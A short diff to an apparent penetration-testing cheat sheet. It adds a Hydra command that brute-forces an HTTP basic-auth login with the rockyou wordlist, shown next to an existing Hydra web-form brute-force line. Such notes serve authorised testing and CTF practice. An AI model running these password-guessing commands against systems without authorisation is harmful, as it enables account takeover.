@@ -83,6 +83,10 @@ Crack Post Web Form
 ``` 
 hydra -l <user> -P /usr/share/wordlists/rockyou.txt <ip> http-post-form "/<login url>:username=^USER^&password=^PASS^&Login=Login:<error message>" -V
 ``` 
+HTTP basic auth (pop up)
+``` 
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s <port> -f <ip> http-get /<page>
+``` 
 
 ## Gobuster
 Basic directory scan
